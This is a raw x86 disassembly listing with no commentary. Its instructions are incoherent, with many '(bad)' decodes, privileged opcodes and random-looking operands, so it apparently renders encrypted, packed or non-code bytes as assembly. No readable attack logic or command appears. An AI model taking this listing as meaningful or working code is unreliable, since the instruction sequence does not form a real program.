  418528:	clc    
  418529:	sbb    ecx,edx
  41852b:	sti    
  41852c:	dec    ecx
  41852d:	pop    ebx
  41852e:	jle    0x418524
  418530:	loopne 0x41858e
  418532:	fwait
  418533:	aad    0x49
  418535:	pop    edx
  418536:	shl    cl,cl
  418538:	pop    ebp
  418539:	dec    edi
  41853a:	or     DWORD PTR [eax],eax
  41853c:	test   DWORD PTR fs:[ecx],ebp
  41853f:	les    esi,FWORD PTR [ebx-0x5822e869]
  418545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418546:	xchg   ecx,eax
  418547:	aam    0x62
  418549:	int    0x44
  41854b:	push   edi
  41854c:	pop    esi
  41854d:	into   
  41854e:	je     0x418513
  418550:	aad    0x3c
  418552:	bound  edi,QWORD PTR [eiz*2+0x5a90c1a2]
  418559:	xlat   BYTE PTR ds:[ebx]
  41855a:	(bad)  
  41855c:	mov    ecx,0x47ddab2f
  418561:	test   DWORD PTR [edx],ebp
  418563:	inc    ebp
  418564:	outs   dx,BYTE PTR ds:[esi]
  418565:	xchg   DWORD PTR [eax],esp
  418567:	mov    ebp,0xdb045904
  41856c:	rol    DWORD PTR ds:0x63a14751,cl
  418572:	and    al,0x54
  418574:	mov    ah,BYTE PTR [ecx]
  418576:	push   ss
  418577:	pop    ebp
  418578:	jg     0x41853a
  41857a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41857b:	je     0x4185fb
  41857d:	addr16 cmp eax,0x3d47e737
  418583:	(bad)
  418586:	sbb    al,0x9
  418588:	cmp    BYTE PTR [ebx-0x7b],ah
  41858b:	arpl   WORD PTR [ebp-0x64],di
  41858e:	dec    ebx
  41858f:	dec    esp
  418590:	mov    ebp,0x87799207
  418595:	or     eax,0x7e16e7de
  41859a:	stos   BYTE PTR es:[edi],al
  41859b:	(bad)  
  41859d:	push   ss
  41859e:	bswap  edx
  4185a0:	stos   BYTE PTR es:[edi],al
  4185a1:	ja     0x4185b6
  4185a3:	mov    eax,ds:0x8beb6852
  4185a8:	fidiv  WORD PTR [edi+0xd]
  4185ab:	call   0x23be5e63
  4185b0:	mov    esp,0x24ed9b70
  4185b5:	push   eax
  4185b6:	fmulp  st(7),st
  4185b8:	out    0x1b,eax
  4185ba:	push   ss
  4185bb:	repz lds eax,FWORD PTR [ebx]
  4185be:	sbb    ch,ah
  4185c0:	sti    
  4185c1:	xchg   esp,eax
  4185c2:	test   ecx,ebx
  4185c4:	test   BYTE PTR [edi],0x7c
  4185c7:	repnz popa 
  4185c9:	dec    esi
  4185ca:	in     eax,dx
  4185cb:	or     BYTE PTR [edx-0x33381e1c],0xf3
  4185d2:	cdq    
  4185d3:	sbb    BYTE PTR [edi-0x7a],dh
  4185d6:	lock sahf 
  4185d8:	push   0x15
  4185da:	adc    al,BYTE PTR [edi-0x8b93b5b]
  4185e0:	add    bh,BYTE PTR ds:0xb9eb8bfb
  4185e6:	jl     0x418637
  4185e8:	xor    edx,ebp
  4185ea:	dec    ecx
  4185eb:	pop    esp
  4185ec:	test   DWORD PTR [ebx+0x3036455],ebx
  4185f2:	and    BYTE PTR [edi-0x7b2456e9],dl
  4185f8:	dec    esi
  4185f9:	mov    al,ds:0x4128d9f7
  4185fe:	jb     0x4185ac
  418600:	jno    0x418680
  418602:	or     BYTE PTR [edx-0x42768c24],cl
  418608:	lods   eax,DWORD PTR ds:[esi]
  418609:	mov    ah,0x25
  41860b:	push   ecx
  41860d:	inc    esp
  41860e:	jno    0x41866c
  418610:	mov    eax,0x1a85f226
  418615:	mov    DWORD PTR ds:0x497fbfc,ebx
  41861b:	leave  
  41861c:	inc    esi
  41861d:	ror    dh,1
  41861f:	adc    DWORD PTR [eax-0x1b74240e],0x60
  418626:	cmp    al,0x2e
  418628:	push   ebp
  418629:	mov    edx,0x42c2f4d3
  41862e:	cmp    ecx,ebx
  418630:	sti    
  418631:	lss    edx,FWORD PTR [eax+0x7d830133]
  418638:	outs   dx,DWORD PTR ds:[esi]
  418639:	dec    ecx
  41863a:	sbb    eax,0x4d393bf8
  41863f:	out    dx,eax
  418640:	push   ds
  418641:	adc    BYTE PTR [esi+0x11a609f8],ch
  418647:	jmp    0x4186bf
  418649:	mov    ecx,0x21e5e41e
  41864e:	and    bl,0x13
  418651:	mov    dh,0xe2
  418653:	adc    al,BYTE PTR [ebx+0x4a]
  418656:	rol    BYTE PTR [esi+edi*8-0x2f19d77b],0x8d
  41865e:	sbb    eax,0x604ac803
  418663:	enter  0xf56e,0xcf
  418667:	sub    dl,BYTE PTR [eax]
  418669:	mov    esp,0x161ce531
  41866e:	mov    bh,0x38
  418670:	daa    
  418671:	jp     0x4186d6
  418673:	mov    eax,0x60b7b65
  418678:	arpl   WORD PTR [ebx-0x9379410],dx
  41867e:	pop    ecx
  41867f:	test   DWORD PTR [eax-0xd],edi
  418682:	mov    eax,ds:0x4f8a31da
  418687:	rcr    BYTE PTR ds:[ecx-0x1d],0xde
  41868c:	add    edx,DWORD PTR cs:[edi+0x5f]
  418690:	xchg   edi,eax
  418691:	gs sub sp,bx
  418695:	lahf   
  418696:	test   eax,0xec825f61
  41869b:	leave  
  41869c:	cmovp  ebx,ebx
  41869f:	lock pop ecx
  4186a1:	fndisi(8087 only) 
  4186a3:	fdiv   st(7),st
  4186a5:	cli    
  4186a6:	or     al,0xa0
  4186a8:	mov    al,0x96
  4186aa:	hlt    
  4186ab:	sbb    BYTE PTR [edi-0x32fe91ba],dl
  4186b1:	dec    esi
  4186b2:	cmp    eax,0x311eb962
  4186b7:	add    cl,BYTE PTR [edi+0x2]
  4186ba:	test   al,0xfa
  4186bc:	repz loopne 0x418688
  4186bf:	imul   ecx,DWORD PTR [edx],0x40535c2c
  4186c5:	mov    dl,0x7f
  4186c7:	cs (bad) 
  4186ca:	dec    ebx
  4186cb:	nop    DWORD PTR [ebp+0x7ed4704c]
  4186d2:	jmp    0xefa0:0x12e48bd8
  4186d9:	mov    ebp,DWORD PTR [edx-0x77]
  4186dc:	test   eax,0xf89fc3c5
  4186e1:	(bad)  
  4186e3:	icebp  
  4186e4:	xchg   esi,eax
  4186e5:	ret    0x170e
  4186e8:	scas   eax,DWORD PTR es:[edi]
  4186e9:	mov    WORD PTR [ebx-0x1c],cs
  4186ec:	call   DWORD PTR [eax+ecx*4+0x11]
  4186f0:	xchg   ebx,eax
  4186f1:	arpl   WORD PTR ds:0x8c4cb326,bp
  4186f7:	pop    eax
  4186f8:	rol    eax,cl
  4186fa:	mov    al,ds:0xa8013641
  4186ff:	pushf  
  418700:	loope  0x4186d7
  418702:	and    DWORD PTR [edi+0xa],eax
  418705:	imul   esi,DWORD PTR [esi-0x1f18dff0],0xffffff97
  41870c:	into   
  41870d:	xor    eax,0x29ef0241
  418712:	pop    ds
  418713:	and    BYTE PTR [eax-0x26],al
  418716:	push   cs
  418717:	(bad)  
  418718:	cli    
  418719:	loope  0x418734
  41871b:	ins    BYTE PTR es:[edi],dx
  41871c:	push   ebx
  41871d:	scas   eax,DWORD PTR es:[edi]
  41871e:	jmp    0x17c4:0x4ef0f26f
  418725:	fld    QWORD PTR [ebp+0xd]
  418728:	push   eax
  418729:	das    
  41872a:	inc    esi
  41872b:	ss inc eax
  41872d:	dec    edi
  41872e:	xor    eax,0x5ab43523
  418733:	or     al,0x71
  418735:	sub    BYTE PTR [esi-0x2582622c],ch
  41873b:	or     al,0x30
  41873d:	loop   0x418747
  41873f:	mov    esi,0x5d026f16
  418744:	jp     0x418732
  418746:	data16 add al,0x1a
  418749:	adc    al,0xe7
  41874b:	int3   
  41874c:	mov    ebx,0x8bf5b012
  418751:	jg     0x418731
  418753:	lahf   
  418754:	jmp    0x4186fb
  418756:	lahf   
  418757:	jle    0x4187ae
  418759:	js     0x418781
  41875b:	test   DWORD PTR [ecx-0x61],eax
  41875e:	pop    ecx
  41875f:	adc    BYTE PTR [ebx-0x77],cl
  418762:	adc    DWORD PTR [edx-0x1c9e17fc],edx
  418768:	pop    edi
  418769:	jecxz  0x4187b8
  41876b:	xchg   dh,al
  41876d:	dec    eax
  41876e:	mov    WORD PTR [esi+ebx*8],ss
  418771:	xchg   ebp,eax
  418772:	lods   al,BYTE PTR ds:[esi]
  418773:	(bad)  
  418774:	das    
  418775:	out    dx,al
  418776:	dec    eax
  418777:	idiv   BYTE PTR [esi+0x4e56b03e]
  41877d:	test   eax,0x63c95e33
  418782:	in     al,dx
  418783:	loope  0x418802
  418785:	sub    al,0xa5
  418787:	retf   
  418788:	test   DWORD PTR ds:0x12884ecf,ebx
  41878e:	mov    ?,esp
  418790:	sub    BYTE PTR [edi-0x38],ah
  418793:	xlat   BYTE PTR ds:[ebx]
  418794:	not    BYTE PTR [edi-0x30]
  418797:	push   0x86f36951
  41879c:	(bad)  
  41879d:	xor    al,dh
  41879f:	lds    edx,FWORD PTR [edi-0x5d]
  4187a2:	push   ebx
  4187a3:	pop    edi
  4187a4:	jae    0x4187e5
  4187a6:	xor    bh,0x7c
  4187a9:	mov    bl,0x39
  4187ab:	sbb    dl,BYTE PTR [ebp-0x5b]
  4187ae:	pop    ebp
  4187af:	push   esp
  4187b0:	leave  
  4187b1:	xor    eax,0xbb08af5b
  4187b6:	pop    edi
  4187b7:	in     al,dx
  4187b8:	test   eax,0xdf560f33
  4187bd:	and    eax,0x534ea0bc
  4187c2:	stc    
  4187c3:	mov    es,ebx
  4187c5:	xchg   esp,eax
  4187c6:	and    DWORD PTR [esi*8+0x5033997c],esi
  4187cd:	push   edx
  4187ce:	ror    WORD PTR [eax],cl
  4187d1:	mov    ds:0x782f44dd,eax
  4187d6:	sbb    bl,ah
  4187d8:	cmp    eax,0x5ffec4d
  4187dd:	cwde   
  4187de:	mov    dl,0x9d
  4187e0:	sub    eax,0x84d8cbd5
  4187e5:	outs   dx,DWORD PTR ds:[esi]
  4187e6:	sar    cl,0xc1
  4187e9:	lahf   
  4187ea:	in     al,0xbf
  4187ec:	lock add ah,BYTE PTR ds:0x70281156
  4187f3:	sub    eax,0xb6e2a445
  4187f8:	nop
  4187f9:	mov    ebx,ecx
  4187fb:	xor    DWORD PTR [esi],edi
  4187fd:	icebp  
  4187fe:	adc    BYTE PTR [ebp+0x4e92975d],bl
  418804:	arpl   WORD PTR [edi-0x77eb8a56],ax
  41880a:	enter  0xe920,0x5
  41880e:	hlt    
  41880f:	jo     0x418849
  418811:	loopne 0x41880f
  418813:	and    ebx,DWORD PTR [ecx]
  418815:	pop    es
  418816:	retf   
  418817:	cmp    edx,DWORD PTR [ebp-0x5de9194c]
  41881d:	shr    DWORD PTR [ecx+0x6671f64],cl
  418823:	jecxz  0x4187e9
  418825:	xor    BYTE PTR [esi+0x26],0xf0
  418829:	rol    BYTE PTR [edx],1
  41882b:	in     eax,dx
  41882c:	cmc    
  41882d:	ret    0x8928
  418830:	gs mov edi,esi
  418833:	cmp    BYTE PTR [ecx],al
  418835:	cmp    ebx,DWORD PTR [ecx+0x66]
  418838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418839:	outs   dx,BYTE PTR ds:[esi]
  41883a:	pushf  
  41883b:	inc    edi
  41883c:	pop    edx
  41883d:	data16 xor al,0xde
  418840:	pop    esi
  418841:	dec    ebp
  418842:	dec    esi
  418843:	lock pop edx
  418845:	call   0xf31d76d5
  41884a:	xor    eax,0xe3081887
  41884f:	pop    ebx
  418850:	setb   BYTE PTR gs:[esi]
  418854:	mov    dh,0x66
  418856:	mov    dh,0x3f
  418858:	arpl   WORD PTR [ebp-0x2a],bx
  41885b:	and    DWORD PTR [ebx+edi*2],ecx
  41885e:	pop    esp
  41885f:	and    BYTE PTR [esi-0x6c],al
  418862:	sbb    ecx,ecx
  418864:	in     al,dx
  418865:	enter  0xeea0,0xca
  418869:	popf   
  41886a:	(bad)
  41886d:	popa   
  41886e:	xchg   DWORD PTR [edi],esp
  418870:	mov    ebx,0x943c51dd
  418875:	je     0x4188dc
  418877:	jb     0x4187fc
  418879:	test   DWORD PTR [ebx],edx
  41887b:	test   BYTE PTR [edi-0x74],al
  41887e:	das    
  41887f:	push   ecx
  418880:	outs   dx,BYTE PTR ds:[esi]
  418881:	mov    edi,ebx
  418883:	repnz adc DWORD PTR gs:[ecx+edi*2],edi
  418888:	mov    gs,edi
  41888a:	retf   
  41888b:	xchg   DWORD PTR [ebx],ebx
  41888d:	xor    al,0x8c
  41888f:	dec    esp
  418890:	arpl   WORD PTR [edi-0x24],sp
  418893:	sub    eax,0xd37631d1
  418898:	sub    al,0xe7
  41889a:	in     al,dx
  41889b:	in     eax,dx
  41889c:	jns    0x4188d5
  41889e:	(bad)  
  41889f:	ret    
  4188a0:	adc    edi,DWORD PTR [edi]
  4188a2:	add    DWORD PTR [edx+0x5b],esi
  4188a5:	sub    DWORD PTR [eax],ebp
  4188a7:	cmp    DWORD PTR [eax+0x4e],eax
  4188aa:	or     BYTE PTR [eax],bl
  4188ac:	and    al,BYTE PTR [ecx+0x4017c01]
  4188b2:	(bad)  
  4188b3:	retf   
  4188b4:	push   cs
  4188b5:	ffree  st(0)
  4188b7:	pop    es
  4188b8:	arpl   WORD PTR [ecx+0x52b291d4],dx
  4188be:	test   DWORD PTR [ebp-0x2],edx
  4188c1:	hlt    
  4188c2:	cmp    al,0x30
  4188c4:	repnz push ds
  4188c6:	mov    al,ds:0xc6e875c6
  4188cb:	mov    ebx,0x54130211
  4188d0:	ds xchg esp,eax
  4188d2:	xor    al,0x2d
  4188d4:	mov    ebx,0xe89a678e
  4188d9:	(bad)  
  4188da:	stc    
  4188db:	retf   
  4188dc:	mov    cs,WORD PTR [ebp-0x22]
  4188df:	ins    DWORD PTR es:[edi],dx
  4188e0:	scas   eax,DWORD PTR es:[edi]
  4188e1:	mov    WORD PTR [edx+0xc],cs
  4188e4:	(bad)  
  4188e5:	dec    esi
  4188e6:	sbb    eax,0x2b335f9b
  4188eb:	(bad)  
  4188ec:	cmp    ah,dh
  4188ee:	jb     0x4188e1
  4188f0:	call   0x242a4fc3
  4188f5:	sub    bl,BYTE PTR [esi]
  4188f7:	pop    ds
  4188f8:	xchg   ebp,eax
  4188f9:	mov    edx,0xbbfee62f
  4188fe:	in     eax,0x51
  418900:	(bad)  
  418902:	pop    esp
  418903:	pop    eax
  418904:	inc    ebx
  418905:	pop    edx
  418906:	dec    ecx
  418907:	es (bad) 
  418909:	repz adc DWORD PTR [edx+0x11fe440e],eax
  418910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418911:	mov    ds:0x452d6f41,eax
  418916:	xchg   ebp,eax
  418917:	idiv   DWORD PTR [edi]
  418919:	sub    DWORD PTR [edx-0x469993fa],edi
  41891f:	xchg   edi,eax
  418920:	add    BYTE PTR [eax+eiz*4-0x72e184b5],0x6c
  418928:	addr16 bswap ebp
  41892b:	jg     0x4188bb
  41892d:	cmp    eax,0xb1b4aad5
  418932:	push   ds
  418933:	in     al,dx
  418934:	xor    ecx,DWORD PTR [edx]
  418936:	sub    DWORD PTR [edx+edi*4+0x74],edx
  41893a:	(bad)  
  41893b:	or     ch,BYTE PTR [ebp-0x51f2eaea]
  418941:	or     dl,BYTE PTR [edx+0x452087a2]
  418947:	or     ebx,DWORD PTR [esi-0x25679110]
  41894d:	xor    DWORD PTR [edi+0x7],0xd84b2405
  418954:	fcomp  QWORD PTR es:0x188887aa
  41895b:	push   0xffffffd4
  41895d:	mov    bh,0x24
  41895f:	(bad)  
  418960:	sbb    eax,0xed6b0505
  418965:	sbb    al,0x77
  418967:	and    bh,0x8d
  41896a:	and    al,0x89
  41896c:	sbb    edx,esi
  41896e:	cmp    DWORD PTR [edi+ebp*2-0x65630851],ecx
  418975:	test   eax,0x62f63392
  41897a:	jno    0x418965
  41897c:	xchg   DWORD PTR ds:0x30cc0c79,ecx
  418982:	gs mov dl,0x72
  418985:	in     eax,0x94
  418987:	xchg   DWORD PTR [eax-0x6a],eax
  41898a:	add    eax,0xdbe751fa
  41898f:	ret    0x9193
  418992:	jnp    0x4189ed
  418994:	sbb    cl,ah
  418996:	and    ch,BYTE PTR [edx+0x6a56a470]
  41899c:	or     esi,ecx
  41899e:	(bad)  
  4189a0:	call   0x974b:0x3897838a
  4189a7:	(bad)  
  4189a8:	push   eax
  4189a9:	or     esp,DWORD PTR ds:0xc4666e30
  4189af:	test   BYTE PTR [esi-0x8b1bfae],dh
  4189b5:	retf   
  4189b6:	jnp    0x4189ed
  4189b8:	or     eax,0x29af9045
  4189bd:	out    dx,eax
  4189be:	push   cs
  4189bf:	int    0xf1
  4189c1:	or     DWORD PTR [ebp+ecx*1-0x40d91eeb],esi
  4189c8:	je     0x418a23
  4189ca:	pop    edi
  4189cb:	lea    ebx,[edi-0x75]
  4189ce:	test   al,0xd8
  4189d0:	hlt    
  4189d1:	scas   al,BYTE PTR es:[edi]
  4189d2:	rcl    al,0xf0
  4189d5:	add    BYTE PTR [ebp+0x3f5e898f],0xe7
  4189dc:	push   ebp
  4189dd:	ins    BYTE PTR es:[edi],dx
  4189de:	test   eax,0x105ba6fe
  4189e3:	cmp    al,0xd0
  4189e5:	in     eax,0xc9
  4189e7:	test   al,0xcd
  4189e9:	bswap  esp
  4189eb:	lods   eax,DWORD PTR ds:[esi]
  4189ec:	sub    BYTE PTR [ecx+esi*2-0x1c],cl
  4189f0:	(bad)  
  4189f1:	js     0x418a18
  4189f3:	sbb    bl,BYTE PTR [ebx-0x6d]
  4189f6:	aaa    
  4189f7:	add    DWORD PTR [edx],edi
  4189f9:	fld    TBYTE PTR [edx]
  4189fb:	sti    
  4189fc:	fldcw  WORD PTR [ecx-0x864b383]
  418a02:	xor    eax,0xfa86f39f
  418a07:	aad    0xbb
  418a09:	(bad)  
  418a0a:	ror    bl,0x5d
  418a0d:	and    al,BYTE PTR ds:0xf1a44ecf
  418a13:	in     eax,dx
  418a14:	cmp    DWORD PTR [eax-0x6e1deced],esp
  418a1a:	in     al,dx
  418a1b:	ret    
  418a1c:	push   ss
  418a1d:	dec    edx
  418a1e:	pop    esp
  418a1f:	xchg   BYTE PTR [eax+edx*1],ch
  418a22:	push   cs
  418a23:	std    
  418a24:	dec    esp
  418a25:	sbb    ch,dl
  418a27:	cmp    ch,BYTE PTR [eax+esi*4+0x352d66f7]
  418a2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a2f:	mov    esi,0x5e95364c
  418a34:	inc    ebx
  418a35:	call   0x3ad375cc
  418a3a:	cs cs cmp eax,0xe33a7acb
  418a41:	ret    0xf10
  418a44:	arpl   WORD PTR [edi+edi*4],bp
  418a47:	and    BYTE PTR [esi],dl
  418a49:	lods   al,BYTE PTR ds:[esi]
  418a4a:	dec    ebp
  418a4b:	std    
  418a4c:	jo     0x418a15
  418a4e:	rol    dl,cl
  418a50:	repnz push edi
  418a52:	test   DWORD PTR [esi],ebp
  418a54:	dec    ecx
  418a55:	hlt    
  418a56:	pop    ebp
  418a57:	push   0xffffff9a
  418a59:	iret   
  418a5a:	push   0xcc8326b4
  418a5f:	jne    0x418a8e
  418a61:	retf   0xe1c8
  418a64:	inc    edi
  418a65:	scas   eax,DWORD PTR es:[edi]
  418a66:	and    ah,BYTE PTR [ebp+0x6db36c6c]
  418a6c:	inc    ebx
  418a6d:	test   BYTE PTR ds:0xbf5d641f,dh
  418a73:	sub    eax,0xc6719812
  418a78:	ins    BYTE PTR es:[edi],dx
  418a79:	pop    ds
  418a7a:	popa   
  418a7b:	pop    edx
  418a7c:	(bad)  
  418a7d:	fiadd  DWORD PTR [edx]
  418a7f:	push   0x10b94846
  418a84:	into   
  418a85:	leave  
  418a86:	ret    
  418a87:	mov    eax,ds:0xb37eaaef
  418a8c:	ja     0x418a52
  418a8e:	mov    cl,0x6d
  418a90:	sub    al,0xca
  418a92:	pop    ds
  418a93:	pop    ss
  418a94:	mov    ch,0x68
  418a96:	cli    
  418a97:	sub    DWORD PTR [ebp-0x29],ebx
  418a9a:	jp     0x418adb
  418a9c:	out    dx,al
  418a9d:	bound  esi,QWORD PTR [edi]
  418a9f:	hlt    
  418aa0:	mov    cl,0x1f
  418aa2:	in     eax,0x19
  418aa4:	xlat   BYTE PTR ds:[ebx]
  418aa5:	adc    edi,DWORD PTR [edi+0x78baec67]
  418aab:	jae    0x418ace
  418aad:	ins    DWORD PTR es:[edi],dx
  418aae:	xor    BYTE PTR [edi],bh
  418ab0:	cs inc esp
  418ab2:	add    ah,BYTE PTR [eax+0x376e3c63]
  418ab8:	xor    dh,BYTE PTR [ebx]
  418aba:	adc    ebx,DWORD PTR [esi+eiz*2-0x3a679489]
  418ac1:	or     edi,eax
  418ac3:	jecxz  0x418a47
  418ac5:	adc    edi,edi
  418ac7:	mov    ebp,0x1a006af6
  418acc:	retf   0x485f
  418acf:	mov    cl,BYTE PTR [ebx+0x26ea853a]
  418ad5:	hlt    
  418ad6:	sub    al,0xa1
  418ad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ad9:	xor    bh,bh
  418adb:	push   ebp
  418adc:	mov    edi,0x454a24fd
  418ae1:	cmc    
  418ae2:	je     0x418a9c
  418ae4:	or     ecx,ebp
  418ae6:	les    ecx,FWORD PTR [ebx]
  418ae8:	pop    ss
  418ae9:	ins    BYTE PTR es:[edi],dx
  418aea:	mov    bh,BYTE PTR [ebp+eax*1-0x16e064ef]
  418af1:	int3   
  418af2:	sub    dl,cl
  418af4:	jp     0x418aaa
  418af6:	fwait
  418af7:	add    BYTE PTR [edx+0x3978d651],ah
  418afd:	(bad)  
  418afe:	out    dx,al
  418aff:	push   ds
  418b00:	mov    eax,0x49f9e9c6
  418b05:	cmp    eax,DWORD PTR [edi]
  418b07:	lahf   
  418b08:	rol    BYTE PTR [ebx],1
  418b0a:	dec    ebp
  418b0b:	dec    ecx
  418b0c:	pop    es
  418b0d:	jl     0x418ac2
  418b0f:	sti    
  418b10:	mov    al,ds:0x42c5710
  418b15:	loope  0x418b8f
  418b17:	test   al,0xe0
  418b19:	xchg   edx,eax
  418b1a:	fbstp  TBYTE PTR [si]
  418b1d:	ficom  WORD PTR [esi-0x4a]
  418b20:	cmp    edx,ebp
  418b22:	mov    di,0x14c3
  418b26:	popa   
  418b27:	mov    esi,0xaec12459
  418b2c:	push   ss
  418b2d:	lea    edx,[ecx+0x67508616]
  418b33:	jo     0x418b5f
  418b35:	jmp    0xdbdb:0x4f06732c
  418b3c:	and    DWORD PTR [ebp+0x3f57ae50],0x51a8e98c
  418b46:	push   ebx
  418b47:	mov    ds:0xac0a4d37,eax
  418b4c:	xchg   ecx,eax
  418b4d:	cmp    al,0x9d
  418b4f:	pop    edx
  418b50:	inc    ebp
  418b51:	or     DWORD PTR [ecx],esi
  418b53:	inc    ebx
  418b54:	hlt    
  418b55:	sahf   
  418b56:	stos   DWORD PTR es:[edi],eax
  418b57:	lock xor al,0x3b
  418b5a:	in     al,0x87
  418b5c:	push   ecx
  418b5d:	sbb    ah,BYTE PTR [edi+ecx*1]
  418b60:	xchg   edx,eax
  418b61:	xchg   edx,eax
  418b62:	inc    ecx
  418b63:	iret   
  418b64:	cmp    dl,0xe8
  418b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b68:	sbb    al,0x2d
  418b6a:	xchg   ebp,eax
  418b6b:	enter  0xb914,0x7e
  418b6f:	or     BYTE PTR [eax-0x3b],bl
  418b72:	pop    esp
  418b73:	dec    esp
  418b74:	aam    0x4d
  418b76:	leave  
  418b77:	xor    BYTE PTR [ecx-0x7d102e4a],dl
  418b7d:	and    ah,BYTE PTR [ebp+0xf]
  418b80:	fadd   st(0),st
  418b82:	cs aad 0x34
  418b85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b86:	retf   0xd9c9
  418b89:	sbb    BYTE PTR [edx],cl
  418b8b:	adc    al,0x13
  418b8d:	call   0xf1b0:0xc33fb6df
  418b94:	test   al,0x92
  418b96:	out    0xc8,al
  418b98:	in     eax,0x69
  418b9a:	ins    DWORD PTR es:[edi],dx
  418b9b:	mov    eax,ds:0xc2221dcd
  418ba0:	and    cx,WORD PTR [esi+0x50554b53]
  418ba7:	sub    bl,BYTE PTR [ebp+0x211f4ef9]
  418bad:	dec    BYTE PTR [ecx]
  418baf:	call   0x6276:0xc6a18a4d
  418bb6:	inc    BYTE PTR [edx]
  418bb8:	stos   BYTE PTR es:[edi],al
  418bb9:	cmp    dh,BYTE PTR [ecx+edi*1-0x43]
  418bbd:	jmp    0xb5f58ceb
  418bc2:	adc    ah,0xdd
  418bc5:	or     ebx,eax
  418bc7:	(bad)  
  418bc8:	icebp  
  418bc9:	dec    eax
  418bca:	mov    ebp,0xbca237cc
  418bcf:	rol    DWORD PTR [edx+0x6372949d],0xda
  418bd6:	cli    
  418bd7:	out    dx,eax
  418bd8:	ins    BYTE PTR es:[edi],dx
  418bd9:	ret    0x1b85
  418bdc:	jne    0x418b9c
  418bde:	lock xor al,0x26
  418be1:	loopne 0x418b64
  418be3:	or     al,0x5d
  418be5:	pop    ds
  418be6:	test   DWORD PTR [ecx+esi*8+0x3f56a38b],ecx
  418bed:	mov    ss,eax
  418bef:	nop
  418bf0:	pop    edi
  418bf1:	ret    0x457f
  418bf4:	or     DWORD PTR [eax-0x4c94573c],0xffffff97
  418bfb:	and    BYTE PTR [esp+edi*4],bh
  418bfe:	and    al,bh
  418c00:	mov    dl,0xc5
  418c02:	pop    edx
  418c03:	gs out 0xb1,al
  418c06:	test   BYTE PTR [edi+0x66],al
  418c09:	mov    BYTE PTR [esi+ebx*4-0x78],dh
  418c0d:	xchg   ebp,eax
  418c0e:	test   BYTE PTR [eax],0xfc
  418c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c12:	add    DWORD PTR [esi+0x19],ebp
  418c15:	ret    0x522
  418c18:	lods   eax,DWORD PTR ds:[esi]
  418c19:	dec    edx
  418c1a:	call   0x31582978
  418c1f:	out    0x4f,al
  418c21:	lods   al,BYTE PTR ds:[esi]
  418c22:	and    DWORD PTR [edx],eax
  418c24:	push   esp
  418c25:	mov    esp,0x2019d3e9
  418c2a:	jle    0x418c6f
  418c2c:	mov    bl,0x85
  418c2e:	arpl   WORD PTR [ebp+0x6667047],bp
  418c34:	(bad)  
  418c35:	into   
  418c36:	dec    bp
  418c38:	fadd   QWORD PTR [ecx-0x225fd370]
  418c3e:	aam    0x8a
  418c40:	into   
  418c41:	data16 int3 
  418c43:	xor    BYTE PTR [ebx],0xb9
  418c46:	mov    ecx,0x671295a4
  418c4b:	pop    ebp
  418c4c:	xchg   ecx,eax
  418c4d:	push   esp
  418c4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c4f:	mov    esp,0x36d9e65f
  418c54:	xor    eax,0x5b649e40
  418c59:	mov    ecx,0xd1e7e363
  418c5e:	pushf  
  418c5f:	xchg   ebp,eax
  418c60:	mov    ch,0x8d
  418c62:	jp     0x418c3e
  418c64:	xor    DWORD PTR [edi-0x29],ebp
  418c67:	cld    
  418c68:	push   eax
  418c69:	jns    0x418c55
  418c6b:	and    BYTE PTR es:0xe79460e2,cl
  418c72:	pop    ecx
  418c73:	out    0xa2,al
  418c75:	cmp    al,0xa5
  418c77:	adc    BYTE PTR [eax+0x27],cl
  418c7a:	mov    esi,0x7f32bf1f
  418c7f:	shl    ch,0xfd
  418c82:	sbb    cl,BYTE PTR [ebx]
  418c84:	aad    0x31
  418c86:	loopne 0x418c8a
  418c88:	fistp  QWORD PTR [edx-0x50]
  418c8b:	jae    0x418cb2
  418c8d:	pop    eax
  418c8e:	fdivr  QWORD PTR [esi-0x12]
  418c91:	repz add DWORD PTR fs:[esi-0xc],edx
  418c96:	cmp    ch,BYTE PTR [edi-0x2437e254]
  418c9c:	mov    esp,0x7b7afe1a
  418ca1:	pop    esi
  418ca2:	jmp    0x40d2:0xf8c197e9
  418ca9:	fidivr DWORD PTR [esi-0x67]
  418cac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cad:	aam    0xcc
  418caf:	cmp    al,ah
  418cb1:	call   FWORD PTR [esi]
  418cb3:	mov    WORD PTR [ebx],?
  418cb5:	sti    
  418cb6:	jo     0x418c6d
  418cb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cb9:	pop    edi
  418cba:	sbb    DWORD PTR [esp+esi*1-0x23d028ad],0xffffffb2
  418cc2:	cdq    
  418cc3:	and    cl,BYTE PTR [edi]
  418cc5:	cmp    edi,DWORD PTR [ebx-0x596b2401]
  418ccb:	(bad)  
  418ccc:	nop
  418ccd:	sub    BYTE PTR [eax+0x37],ah
  418cd0:	inc    edi
  418cd1:	nop
  418cd2:	std    
  418cd3:	sub    eax,0x7bc4d603
  418cd8:	iret   
  418cd9:	push   edx
  418cda:	xor    ch,BYTE PTR [ebx]
  418cdc:	pop    esp
  418cdd:	nop
  418cde:	mov    dl,0x1c
  418ce0:	in     eax,0xe8
  418ce2:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  418ce4:	jl     0x418caf
  418ce6:	test   eax,0x9170859c
  418ceb:	push   esi
  418cec:	jb     0x418c9d
  418cee:	jb     0x418cc4
  418cf0:	pop    eax
  418cf1:	sub    BYTE PTR [edi],dh
  418cf3:	cmp    DWORD PTR [eax+0x68b7ccf],0x51
  418cfa:	sub    eax,0x488fb00e
  418cff:	fild   QWORD PTR [ecx+0xfac4a7a]
  418d05:	out    dx,al
  418d06:	inc    esi
  418d07:	push   esp
  418d08:	pusha  
  418d09:	test   DWORD PTR [esi],ecx
  418d0b:	jg     0x418cde
  418d0d:	or     edi,DWORD PTR [ebx+0x3]
  418d10:	or     edx,DWORD PTR [edx-0x27]
  418d13:	mov    gs,WORD PTR [ebx-0x77cfdef5]
